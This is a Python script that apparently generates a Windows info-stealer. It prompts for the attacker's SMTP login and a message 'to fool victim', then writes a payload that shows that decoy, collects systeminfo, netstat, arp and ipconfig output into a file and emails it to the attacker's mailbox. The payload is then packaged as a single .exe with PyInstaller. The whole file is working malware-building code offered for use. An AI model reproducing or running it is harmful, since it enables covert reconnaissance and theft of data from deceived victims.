import os
import platform
from files.banner import banner, banner2
from getpass import getpass
from colorama import Fore
from time import sleep
import webbrowser

webbrowser.open("intro.html")

B = Fore.BLUE
R = Fore.RED
W = Fore.LIGHTWHITE_EX
Y = Fore.YELLOW
C = Fore.CYAN
G = Fore.GREEN


def command(str):
    os.system(str)


def colors(str):
    return f"\n{W}[{B}</>{W}] {str}"


command("cls") if 'Windows' in platform.platform() else command("clear")

banner()


def genertor():
    mail = input(f"\n{C}[{R}-{C}]{Y} Enter SMTP host: " + W)
    port = input(f"\n{C}[{R}-{C}]{Y} Enter SMTP port: (25/465/587) " + W)
    user = input(f"\n{C}[{R}-{C}]{Y} Enter SMTP user:" + W)
    paswd = getpass(f"{Y}[{R}?{Y}] Password: ")

    custom_msg = input(f"{Y}[{C}>{Y}] Type custom message to fool victim: " + W)

    per = 0

    while per != 101:
        string = f"{Y} <{R}/{Y}> {W}Preparing...\t" + C + str(per) + "%"
        sleep(0.1)
        print(string, end="\r")

        per += 1

    script = """

import os
import smtplib
import requests

print("__custom_message ")

url = "https://www.google.com"
try:
    url = requests.get(url)

    if url.status_code != 200:
        exit()
except Exception:
    exit()

file = "USB.txt"

def cmd(str):
    os.system(str)

def mailer(file):
    with open(file , "r") as f:
        read = f.read()

    server = smtplib.SMTP("__smtp" , __port)
    server.ehlo()
    server.starttls()
    server.login("__mail" , "__password" )
    server.sendmail("__mail" , "__mail" , read)

cmd("systeminfo > /dev/null >> USB.txt")
cmd("netstat -n > /dev/null >> USB.txt")
cmd("netstat -a > /dev/null >> USB.txt")
cmd("netstat -r > /dev/null >> USB.txt")
cmd("netstat -s > /dev/null >> USB.txt")
cmd("arp -a > /dev/null >> USB.txt")
cmd("ipconfig > /dev/null >> USB.txt")

mailer(file)

os.remove("USB.txt")
    

input("\\n--- Done\\n[\\t[+] Press enter to exit")
"""

    script = script.replace("__mail", user).replace('__smtp', mail).replace('__port' , port)
    script = script.replace("__password", paswd)
    script = script.replace("__custom_message", custom_msg)

    if os.path.exists("generator.py"):
        os.remove("generator.py")

    with open("generator.py", "a+") as f:
        f.write(script)

        print(colors("\nGenerated! \n"))

    print(colors("Creating .exe..."))

    command("pyinstaller generator.py --onefile")

    input(C + "\n\tPress enter to exit! ")


genertor()
